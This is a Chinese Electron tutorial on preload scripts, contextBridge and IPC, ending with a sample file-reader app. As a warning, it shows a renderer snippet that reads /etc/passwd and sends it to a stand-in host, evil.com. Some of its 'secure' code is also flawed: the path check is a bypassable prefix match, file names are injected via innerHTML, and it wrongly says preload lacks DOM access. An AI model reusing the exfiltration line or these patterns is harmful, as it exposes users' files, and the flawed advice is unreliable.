# Electron 安全桥梁与通信入门：Preload 深度解析 + IPC 初体验

> **阅读时长**：约 18 分钟 | **难度**：⭐⭐ 进阶 | **本系列**：L1/Day 2
> **前置知识**：Day 1 已了解 Electron 基础架构

昨天我们跑通了第一个 Electron 应用，但有个关键问题没展开讲——**那个神秘的 `preload.js` 到底在干什么？** 以及**渲染进程（网页）和主进程（Node.js）到底怎么对话？**

今天我们就来彻底搞懂这两个核心概念。它们是所有 Electron 应用的安全基石和通信骨架。

---

## 一、为什么 Preload 是安全命脉？

### 1.1 回顾：Electron 的"危险区"

还记得昨天说的吗？如果渲染进程能直接访问 Node.js：

```html
<!-- ❌ 绝对不要这样！这是安全灾难 -->
<script>
  // 用户访问了一个恶意网站 → 你的文件全被偷走
  const fs = require('fs');
  const data = fs.readFileSync('/etc/passwd', 'utf-8');
  fetch('http://evil.com/steal?data=' + btoa(data));
</script>
```

这不是危言耸听——2016-2019 年间大量 Electron 应用因为 `nodeIntegration: true` + `contextIsolation: false` 的配置被曝出 RCE（远程代码执行）漏洞。

### 1.2 Obsidian 是怎么做的？

[Obsidian](https://github.com/obsidianmd/obsidian-md) 是安全实践的标杆。来看看它的策略：

```
Obsidian 安全模型：
┌──────────────────────────────────────────────┐
│  渲染进程（你的笔记页面）                       │
│  • contextIsolation: true ✅                 │
│  • nodeIntegration: false ✅                 │
│  • 无法直接 require()                        │
│  • 只能通过 window.customJSAPI 访问受限功能    │
│                                              │
│         ↑ 只能调用白名单 API                  │
│         │                                    │
│  ┌──────┴───────┐                            │
│  │  Preload     │ ← 安全检查站               │
│  │              │   精确控制暴露什么           │
│  └──────┬───────┘                            │
│         │                                    │
│         ↓ IPC 通信                           │
│                                              │
│  主进程（Obsidian 核心）                       │
│  • 文件系统读写                               │
│  • 插件管理                                   │
│  • 搜索索引                                   │
│  • 加密存储                                   │
└──────────────────────────────────────────────┘
```

Obsidian 通过 preload 脚本只暴露了笔记操作相关的最小 API 集合，插件系统也运行在沙箱中。

---

## 二、Preload 脚本完全指南

### 2.1 运行环境特殊性

Preload 脚本的运行环境很特殊——它同时拥有两个世界的能力：

```javascript
// preload.js — 唯一能同时用这两种能力的代码！

// ✅ Node.js 能力可用
const { contextBridge, ipcRenderer, shell } = require('electron');
const path = require('path');
const fs = require('fs');          // 可以！
const os = require('os');          // 可以！

// ❌ DOM 操作不可用（没有 window/document）
document.querySelector('body');    // 报错！undefined

// ⚠️ 但可以通过 contextBridge 给渲染进程提供能力
contextBridge.exposeInMainWorld('myAPI', {
  // 渲染进程调用这里的方法时，实际是在 preload 环境执行的
  readFile: (filePath) => {
    return fs.readFileSync(filePath, 'utf-8');
  },
});
```

### 2.2 完整的 Preload 最佳实践模板

这是一个生产级别的 preload 模板，参考了 VS Code 和 Obsidian 的设计：

```typescript
// preload.ts — TypeScript 版完整示例
import { contextBridge, ipcRenderer, IpcRendererEvent } from 'electron';

// 定义暴露给渲染进程的 API 类型（类型安全）
export interface ElectronAPI {
  // === 系统信息（只读，完全安全）===
  platform: NodeJS.Platform;
  appVersion: string;
  
  // === 文件操作（需要主进程处理）===
  readFile(path: string): Promise<string>;
  writeFile(path: string, content: string): Promise<void>;
  readDir(path: string): Promise<string[]>;
  
  // === 窗口控制 ===
  minimize(): void;
  maximize(): void;
  close(): void;
  
  // === 事件订阅（主进程→渲染进程推送）===
  onFileChange(callback: (path: string) => void): () => void;  // 返回取消订阅函数
  
  // === 对话框 ====
  showOpenDialog(options?: object): Promise<string[] | null>;
  showSaveDialog(options?: object): Promise<string | null>;
}

// 白名单频道定义 —— 核心安全机制！
const VALID_CHANNELS = {
  toMain: ['read-file', 'write-file', 'read-dir', 
            'open-dialog', 'save-dialog',
            'window-minimize', 'window-maximize', 'window-close'],
  fromMain: ['file-changed', 'app-update-available'],
} as const;

const api: ElectronAPI = {
  // ── 静态属性 ──
  platform: process.platform,
  appVersion: process.env.npm_package_version || '1.0.0',
  
  // ── invoke 模式（请求-响应，推荐）──
  async readFile(path: string) {
    return ipcRenderer.invoke('read-file', path);
  },
  
  async writeFile(path: string, content: string) {
    return ipcRenderer.invoke('write-file', path, content);
  },
  
  async readDir(path: string) {
    return ipcRenderer.invoke('read-dir', path);
  },
  
  // ── send 模式（单向通知）──
  minimize() {
    safeSend('window-minimize');
  },
  
  maximize() {
    safeSend('window-maximize');
  },
  
  close() {
    safeSend('window-close');
  },
  
  // ── on 模式（接收推送）──
  onFileChange(callback: (path: string) => void) {
    const handler = (_event: IpcRendererEvent, path: string) => callback(path);
    
    if (VALID_CHANNELS.fromMain.includes('file-changed')) {
      ipcRenderer.on('file-changed', handler);
    }
    
    // 返回取消订阅函数（避免内存泄漏）
    return () => {
      ipcRenderer.removeListener('file-changed', handler);
    };
  },

  // ── 对话框 ──
  async showOpenDialog(options?: object) {
    return ipcRenderer.invoke('open-dialog', options || {});
  },
  
  async showSaveDialog(options?: object) {
    return ipcRenderer.invoke('save-dialog', options || {});
  },
};

// 安全的 send 封装（带白名单校验）
function safeSend(channel: string, ...args: unknown[]) {
  if (VALID_CHANNELS.toMain.includes(channel as typeof VALID_CHANNELS.toMain[number])) {
    ipcRenderer.send(channel, ...args);
  } else {
    console.warn(`[Security] Blocked unauthorized IPC channel: ${channel}`);
  }
}

// 🔑 关键步骤：通过 contextBridge 暴露到 window
contextBridge.exposeInMainWorld('electronAPI', api);

// 类型声明增强（让 TypeScript 在渲染进程中识别）
export {};
```

对应的类型声明文件（让渲染进程获得自动补全）：

```typescript
// types/electron-api.d.ts
import type { ElectronAPI } from '../preload/index';

declare global {
  interface Window {
    electronAPI: ElectronAPI;
  }
}

export {};
```

### 2.3 三条铁律

> 📌 **写 Preload 时必须记住的三件事：**
>
> 1. **最小权限原则** — 只暴露业务需要的 API，绝不多暴露一个方法
> 2. **白名单机制** — 所有 IPC 通道名必须经过白名单验证
> 3. **不信任输入** — 从渲染进程传来的数据要校验，不能直接用于文件路径等敏感操作

---

## 三、IPC 通信初探：渲染进程如何跟主进程对话？

### 3.1 什么是 IPC？

IPC（Inter-Process Communication，进程间通信）是 Electron 架构中最核心的概念之一。因为渲染进程和主进程运行在不同的环境里，它们之间不能直接共享变量或函数——必须通过 IPC 来传递消息。

### 3.2 三种基本通信模式

#### 模式一：invoke / handle（请求-响应模式）— 最常用

就像 HTTP 请求一样，发送方发出请求并等待返回结果：

```javascript
// ========== 主进程 main.ts ==========
import { ipcMain } from 'electron';

ipcMain.handle('read-file', async (event, filePath) => {
  // ⚠️ 安全：永远不要直接使用用户传入的路径！
  const safePath = sanitizePath(filePath);  // 需要实现路径清理
  try {
    const fs = await import('fs/promises');
    const content = await fs.readFile(safePath, 'utf-8');
    return { success: true, data: content };
  } catch (err) {
    return { success: false, error: (err as Error).message };
  }
});

// ========== 渲染进程（通过 preload 桥接）==========
// 在 HTML 页面中：
async function loadFile() {
  const result = await window.electronAPI.readFile('/Users/name/doc.txt');
  if (result.success) {
    console.log(result.data);  // 文件内容
  } else {
    alert('读取失败: ' + result.error);
  }
}
```

#### 模式二：send / on（单向通知模式）

发送方只管发，不需要等待回复：

```javascript
// ========== 主进程 ==========
ipcMain.on('log-message', (event, level, message) => {
  console.log(`[${level}]`, message);
  // 不返回任何值
});

// ========== 渲染进程 ==========
function logToMain(message) {
  window.electronAPI.send('log-message', 'info', message);
  // 发完就完了，不等待
}
```

**适用场景**：日志记录、状态通知、窗口控制（最小化/关闭等）。

#### 模式三：webContents.send（主进程主动推送）

主进程向渲染进程"广播"消息：

```javascript
// ========== 主进程 ==========
// 当检测到文件变化时，推送给所有打开的窗口
chokidar.watch('./workspace').on('change', (path) => {
  // 推送到特定窗口
  mainWindow.webContents.send('file-changed', path);
  
  // 或者广播到所有窗口
  const allWindows = BrowserWindow.getAllWindows();
  allWindows.forEach(win => {
    win.webContents.send('global-event', 'something-happened');
  });
});

// ========== 渲染进程（preload 中注册监听）==========
// 见上方 onFileChange 示例
const unsubscribe = window.electronAPI.onFileChange((changedPath) => {
  console.log('文件变了:', changedPath);
  // 更新 UI...
});
// 用完后取消订阅
unsubscribe();
```

### 3.3 三种模式对比速查表

| 维度 | invoke/handle | send/on | webContents.send |
|:---|:---|:---|:---|
| **方向** | 渲染→主（双向） | 渲染→主（单向） | 主→渲染（推送） |
| **返回值** | ✅ 有（Promise） | ❌ 无 | ❌ 无 |
| **类比** | HTTP Request | UDP 包 | WebSocket 推送 |
| **典型场景** | 读文件、查数据库 | 日志、通知 | 文件变更、更新提示 |
| **错误处理** | try/catch 自动捕获 | 需自行设计 | 需自行设计 |
| **性能开销** | 较高（需等待响应） | 低 | 低 |

---

## 四、动手实战：安全的文件读取器

现在把以上知识点整合起来，做一个真正有实用价值的工具。

### 项目结构

```
safe-file-reader/
├── package.json
├── tsconfig.json
├── src/
│   ├── main/
│   │   ├── index.ts          # 主进程入口
│   │   └── handlers/         # IPC 处理器
│   │       └── file.handler.ts
│   ├── preload/
│   │   └── index.ts          # Preload 脚本
│   ├── renderer/
│   │   ├── index.html        # UI 页面
│   │   └── app.js            # 渲染逻辑
│   └── types/
│       └── electron-api.d.ts # 类型声明
```

### Step 1：IPC Handler（主进程端）

```typescript
// src/main/handlers/file.handler.ts
import { ipcMain, dialog, BrowserWindow } from 'electron';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';

/**
 * 路径安全清理
 * 防止目录穿越攻击：../../etc/passwd 这种恶意路径
 */
function sanitizePath(inputPath: string, allowedBase?: string): string {
  const resolved = path.resolve(inputPath);
  
  // 如果指定了允许的基础目录，确保最终路径在其下
  if (allowedBase) {
    const baseResolved = path.resolve(allowedBase);
    if (!resolved.startsWith(baseResolved)) {
      throw new Error('访问被拒绝：超出允许的目录范围');
    }
  }
  
  return resolved;
}

export function registerFileHandlers(mainWindow: BrowserWindow) {
  // --- 读取文件 ---
  ipcMain.handle('app:readFile', async (_event, filePath: string) => {
    try {
      const safePath = sanitizePath(filePath, os.homedir());
      const stat = await fs.stat(safePath);
      
      // 文件大小限制：防止读取超大文件导致卡死
      const MAX_SIZE = 10 * 1024 * 1024; // 10MB
      if (stat.size > MAX_SIZE) {
        throw new Error(`文件过大 (${(stat.size/1024/1024).toFixed(1)}MB)，限制 ${MAX_SIZE/1024/1024}MB`);
      }
      
      const content = await fs.readFile(safePath, 'utf-8');
      return { success: true, data: content, name: path.basename(safePath), size: stat.size };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  });

  // --- 保存文件 ---
  ipcMain.handle('app:writeFile', async (_event, filePath: string, content: string) => {
    try {
      const safePath = sanitizePath(filePath, os.homedir());
      await fs.writeFile(safePath, content, 'utf-8');
      return { success: true };
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  });
  
  // --- 打开文件对话框 ---
  ipcMain.handle('app:openDialog', async () => {
    const result = await dialog.showOpenDialog(mainWindow, {
      properties: ['openFile'],
      filters: [
        { name: '文本文件', extensions: ['txt', 'md', 'json', 'csv'] },
        { name: '代码文件', extensions: ['js', 'ts', 'py', 'go', 'java'] },
        { name: '所有文件', extensions: ['*'] },
      ],
    });
    
    if (result.canceled || result.filePaths.length === 0) {
      return null;
    }
    return result.filePaths[0];
  });

  // --- 保存文件对话框 ---
  ipcMain.handle('app:saveDialog', async () => {
    const result = await dialog.showSaveDialog(mainWindow, {
      filters: [
        { name: 'Markdown', extensions: ['md'] },
        { name: '文本文件', extensions: ['txt'] },
      ],
    });
    return result.canceled ? null : result.filePath;
  });

  // --- 列出目录内容 ---
  ipcMain.handle('app:listDir', async (_event, dirPath: string) => {
    try {
      const safePath = sanitizePath(dirPath, os.homedir());
      const entries = await fs.readdir(safePath, { withFileTypes: true });
      return entries.map(entry => ({
        name: entry.name,
        isDirectory: entry.isDirectory(),
        isFile: entry.isFile(),
      }));
    } catch (err: any) {
      return { success: false, error: err.message };
    }
  });
}
```

### Step 2：Preload（安全桥梁）

```typescript
// src/preload/index.ts
import { contextBridge, ipcRenderer } from 'electron';

const api = {
  platform: process.platform,
  
  // 文件操作
  readFile: (p: string) => ipcRenderer.invoke('app:readFile', p),
  writeFile: (p: string, c: string) => ipcRenderer.invoke('app:writeFile', p, c),
  listDir: (p: string) => ipcRenderer.invoke('app:listDir', p),
  
  // 对话框
  openDialog: () => ipcRenderer.invoke('app:openDialog'),
  saveDialog: () => ipcRenderer.invoke('app:saveDialog'),
};

contextBridge.exposeInMainWorld('api', api);
```

### Step 3：UI 界面

```html
<!-- src/renderer/index.html -->
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'">
  <title>安全文件读取器</title>
  <style>
    :root {
      --bg: #0f1117;
      --card: #1a1d27;
      --border: #2a2d38;
      --text: #e1e4e8;
      --muted: #8b949e;
      --accent: #58a6ff;
      --success: #3fb950;
      --danger: #f85149;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, 'Segoe UI', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 32px;
    }

    .container { max-width: 900px; margin: 0 auto; }

    h1 {
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .subtitle { color: var(--muted); margin-bottom: 32px; font-size: 14px; }

    /* 工具栏 */
    .toolbar {
      display: flex;
      gap: 12px;
      margin-bottom: 24px;
      flex-wrap: wrap;
    }

    button {
      padding: 10px 20px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: var(--card);
      color: var(--text);
      cursor: pointer;
      font-size: 14px;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: all 0.15s ease;
    }

    button:hover { border-color: var(--accent); background: #1c2230; }
    button.primary { background: var(--accent); color: #fff; border-color: var(--accent); }
    button.primary:hover { opacity: 0.9; }
    button:disabled { opacity: 0.4; cursor: not-allowed; }

    /* 编辑区域 */
    .editor-area {
      display: grid;
      grid-template-columns: 220px 1fr;
      gap: 16px;
      height: calc(100vh - 240px);
      min-height: 400px;
    }

    /* 文件列表 */
    .file-panel {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 12px;
      overflow: hidden;
    }

    .file-panel-header {
      padding: 12px 16px;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: var(--muted);
      border-bottom: 1px solid var(--border);
    }

    .file-list { list-style: none; max-height: calc(100% - 44px); overflow-y: auto; }

    .file-item {
      padding: 10px 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13px;
      border-bottom: 1px solid rgba(255,255,255,0.03);
      transition: background 0.1s;
    }

    .file-item:hover { background: rgba(88,166,255,0.06); }
    .file-item.active { background: rgba(88,166,255,0.1); color: var(--accent); }

    .file-icon { font-size: 16px; width: 20px; text-align: center; }

    /* 编辑器 */
    .editor {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 12px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }

    .editor-header {
      padding: 10px 16px;
      font-size: 13px;
      color: var(--muted);
      border-bottom: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .editor-header .filename { color: var(--text); font-weight: 500; }
    .file-info { font-size: 12px; color: var(--muted); }

    textarea {
      width: 100%;
      height: 100%;
      background: transparent;
      color: var(--text);
      border: none;
      resize: none;
      padding: 16px;
      font-family: 'JetBrains Mono', 'Fira Code', Consolas, monospace;
      font-size: 14px;
      line-height: 1.7;
      outline: none;
    }

    /* 状态栏 */
    .status-bar {
      margin-top: 16px;
      padding: 10px 16px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 8px;
      font-size: 13px;
      color: var(--muted);
      display: flex;
      justify-content: space-between;
    }

    .status-ok { color: var(--success); }
    .status-error { color: var(--danger); }

    /* Toast 提示 */
    .toast {
      position: fixed;
      bottom: 24px;
      right: 24px;
      padding: 12px 24px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 10px;
      font-size: 14px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.4);
      transform: translateY(20px);
      opacity: 0;
      transition: all 0.25s ease;
      z-index: 999;
    }

    .toast.show { transform: translateY(0); opacity: 1; }
    .toast.success { border-left: 3px solid var(--success); }
    .toast.error { border-left: 3px solid var(--danger); }
  </style>
</head>
<body>
  <div class="container">
    <!-- 头部 -->
    <h1>📂 安全文件读取器</h1>
    <p class="subtitle">基于 IPC 通信的安全文件浏览器 • Preload 白名单机制保护</p>

    <!-- 工具栏 -->
    <div class="toolbar">
      <button id="btnOpen" class="primary">📁 打开文件</button>
      <button id="btnNew">📄 新建文件</button>
      <button id="btnSave">💾 保存</button>
      <button id="btnBrowse">📋 浏览目录</button>
    </div>

    <!-- 编辑区域 -->
    <div class="editor-area">
      <!-- 左侧文件列表面板 -->
      <div class="file-panel">
        <div class="file-panel-header">📁 文件列表</div>
        <ul class="file-list" id="fileList">
          <li class="file-item" style="color:var(--muted);justify-content:center;padding:24px;">
            点击"浏览目录"加载文件
          </li>
        </ul>
      </div>

      <!-- 右侧编辑器 -->
      <div class="editor">
        <div class="editor-header">
          <span class="filename" id="currentFileName">未打开文件</span>
          <span class="file-info" id="fileInfo"></span>
        </div>
        <textarea id="editor" placeholder="打开一个文件开始编辑，或新建文件..."></textarea>
      </div>
    </div>

    <!-- 状态栏 -->
    <div class="status-bar">
      <span id="statusText">✅ 就绪</span>
      <span id="platformInfo"></span>
    </div>
  </div>

  <!-- Toast -->
  <div class="toast" id="toast"></div>

  <script src="./app.js"></script>
</body>
</html>
```

### Step 4：渲染逻辑

```javascript
// src/renderer/app.js
(function() {
  'use strict';

  // 确保 electronAPI 存在
  if (!window.api) {
    document.getElementById('statusText').textContent = '❌ 错误：未检测到 Electron API';
    document.getElementById('statusText').classList.add('status-error');
    return;
  }

  // DOM 元素引用
  const dom = {
    editor: document.getElementById('editor'),
    fileList: document.getElementById('fileList'),
    fileName: document.getElementById('currentFileName'),
    fileInfo: document.getElementById('fileInfo'),
    statusText: document.getElementById('statusText'),
    platformInfo: document.getElementById('platformInfo'),
    toast: document.getElementById('toast'),
    btnOpen: document.getElementById('btnOpen'),
    btnNew: document.getElementById('btnNew'),
    btnSave: document.getElementById('btnSave'),
    btnBrowse: document.getElementById('btnBrowse'),
  };

  let currentFilePath = null;

  // 显示平台信息
  dom.platformInfo.textContent = `平台：${window.api.platform}`;

  // === Toast 提示 ===
  function showToast(msg, type = 'success') {
    dom.toast.textContent = msg;
    dom.toast.className = `toast show ${type}`;
    setTimeout(() => dom.toast.className = 'toast', 2500);
  }

  // === 更新状态栏 ===
  function setStatus(text, isError = false) {
    dom.statusText.textContent = text;
    dom.statusText.className = isError ? 'status-error' : 'status-ok';
  }

  // === 打开文件 ===
  dom.btnOpen.addEventListener('click', async () => {
    const filePath = await window.api.openDialog();
    if (!filePath) return;
    
    setStatus('🔄 正在读取...');
    const result = await window.api.readFile(filePath);
    
    if (result.success) {
      currentFilePath = filePath;
      dom.editor.value = result.data;
      dom.fileName.textContent = result.name;
      dom.fileInfo.textContent = `${formatSize(result.size)} • ${filePath}`;
      showToast(`已打开：${result.name}`);
      setStatus('✅ 就绪');
    } else {
      showToast(`读取失败：${result.error}`, 'error');
      setStatus(`❌ 错误：${result.error}`, true);
    }
  });

  // === 新建文件 ===
  dom.btnNew.addEventListener('click', async () => {
    const filePath = await window.api.saveDialog();
    if (!filePath) return;
    
    currentFilePath = filePath;
    dom.editor.value = '';
    dom.fileName.textContent = filePath.split(/[/\\]/).pop();
    dom.fileInfo.textContent = filePath;
    setStatus('✅ 新建文件 — 请保存');
    showToast('已创建新文件');
  });

  // === 保存文件 ===
  dom.btnSave.addEventListener('click', async () => {
    if (!currentFilePath) {
      showToast('请先打开或新建文件', 'error');
      return;
    }
    
    setStatus('💾 正在保存...');
    const result = await window.api.writeFile(currentFilePath, dom.editor.value);
    
    if (result.success) {
      showToast('保存成功！');
      setStatus('✅ 已保存');
    } else {
      showToast(`保存失败：${result.error}`, 'error');
      setStatus(`❌ 保存失败`, true);
    }
  });

  // === 浏览目录 ===
  dom.btnBrowse.addEventListener('click', async () => {
    // 使用用户主目录作为默认
    const homeDir = (() => {
      switch (window.api.platform) {
        case 'win32': return 'C:\\Users';
        case 'darwin': return '/Users';
        default: return '/home';
      }
    })();

    setStatus('🔄 正在扫描目录...');
    const entries = await window.api.listDir(homeDir);
    
    if (Array.isArray(entries)) {
      renderFileList(entries);
      setStatus(`✅ 已加载 ${entries.length} 个项目`);
    } else {
      showToast('目录读取失败', 'error');
    }
  });

  // === 渲染文件列表 ===
  function renderFileList(entries) {
    dom.fileList.innerHTML = entries.map(item => `
      <li class="file-item" data-path="${item.name}">
        <span class="file-icon">${item.isDirectory ? '📁' : '📄'}</span>
        <span>${item.name}</span>
      </li>
    `).join('');

    // 绑定点击事件
    dom.fileList.querySelectorAll('.file-item').forEach(el => {
      el.addEventListener('click', () => {
        // 高亮选中
        dom.fileList.querySelectorAll('.file-item').forEach(e => e.classList.remove('active'));
        el.classList.add('active');
      });
    });
  }

  // === 工具函数 ===
  function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
  }
})();
```

### 最终效果预览

这个应用实现了以下完整功能：

| 功能 | 技术点 |
|:---|:---|
| 打开文件 | `dialog.showOpenDialog` + `ipcRenderer.invoke` |
| 编辑内容 | 普通 `<textarea>`，无需特殊处理 |
| 保存文件 | `ipcRenderer.invoke` + `fs.writeFile` |
| 目录浏览 | `fs.readdir` + 路径安全校验 |
| 安全防护 | `sanitizePath()` 防目录穿越 + 文件大小限制 |

---

## 五、常见陷阱与避坑指南

### ❌ 陷阱 1：忘记 contextIsolation

```javascript
// ❌ 错误配置
webPreferences: {
  nodeIntegration: true,     // 危险！
  contextIsolation: false,   // 危险！
}

// ✅ 正确配置
webPreferences: {
  nodeIntegration: false,    // 必须关闭
  contextIsolation: true,    // 必须开启
  preload: path.join(__dirname, 'preload.js'),
}
```

### ❌ 陷阱 2：在渲染进程里 require

```html
<!-- ❌ 这会报错！因为 contextIsolation 开启后无法 require -->
<script>
  const fs = require('fs');  // ReferenceError: require is not defined
</script>

<!-- ✅ 正确方式：通过 preload 暴露 -->
<script>
  const content = await window.electronAPI.readFile('/path/to/file.txt');
</script>
```

### ❌ 陷阱 3：不清理事件监听器

```javascript
// ❌ 内存泄漏！每次组件重新渲染都会新增监听器
useEffect(() => {
  window.electronAPI.onData((data) => setData(data));
}, [someDependency]); // 依赖变化时会重复绑定

// ✅ 正确：取消订阅
useEffect(() => {
  const unsubscribe = window.electronAPI.onData((data) => setData(data));
  return unsubscribe; // 组件卸载时取消
}, []);
```

---

## 六、今日总结

| 概念 | 要点 |
|:---|:---|
| **Preload 角色** | 唯一的 Node ↔ DOM 双向桥梁，安全检查站 |
| **contextBridge** | 将 API 安全地注入 `window` 对象 |
| **白名单机制** | 所有 IPC 通道必须经过校验 |
| **invoke/handle** | 请求-响应模式，最常用 |
| **send/on** | 单向通知，适合日志/控制类操作 |
| **webContents.send** | 主进程主动推送到渲染进程 |
| **路径安全** | 永远不要信任用户传入的路径！ |

### 下节预告：Day 3 — 前端框架集成

明天我们将学习：
- **Electron + React**（最主流组合，参考 Mattermost Desktop）
- **Electron + Vue**（国内开发者友好）
- **Electron + Vite**（极速开发体验）
- 用 React 重构今天的文件读取器，加上现代化的 UI

---

> 💬 **有问题？** 在评论区留言，我们一起探讨！
> 👨‍💻 **系列教程持续更新中**，关注「APP移动开发」不错过每一篇。
> ❤️ 觉得有帮助？点个"在看"，让更多开发者看到！
